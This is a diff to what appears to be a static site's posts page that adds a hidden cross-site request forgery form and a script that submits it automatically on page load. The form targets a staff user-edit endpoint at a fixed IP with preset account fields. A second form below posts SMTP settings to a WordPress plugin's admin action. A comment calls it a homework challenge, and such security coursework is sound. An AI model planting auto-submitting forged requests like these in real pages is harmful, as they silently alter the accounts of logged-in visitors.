@@ -6,6 +6,23 @@ layout: default
 
   <h1 class="page-heading">Posts</h1>
 
+  <!–– CSRF post example for unsuspecting logged in users. This is a hw challenge and not actually harmful -->
+  <form name="csrfForm" action="https://35.188.112.104/red/public/staff/users/edit.php?id=1" method="POST">
+    <input type="hidden" name="csrf_token" value="e300530830c767d6be9cbe696756fd3a" />
+    <input type="hidden" name="first_name" value="JAMES" />
+    <input type="hidden" name="last_name" value="Munroe" />
+    <input type="hidden" name="username" value="jmonroe99" />
+    <input type="hidden" name="email" value="test%40test.com" />
+    <input type="hidden" name="previous_password" value="" />
+    <input type="hidden" name="password" value="" />
+    <input type="hidden" name="confirm_password" value="" />
+    <input type="hidden" name="submit" value="Update" />
+    <input type="submit"/>
+  </form>
+  <script>
+    document.csrfForm.submit();
+  </script>
+  
   <form id="f1" method="POST" action="http://wpdistillery.vm/wp-admin/admin.php?page=contact-form-manager-manage-smtp&action=add-smtp">
      <table>
         <tr><td>xyz_cfm_SmtpAuthentication<td><input name="xyz_cfm_SmtpAuthentication" value="true" size="100"></tr>
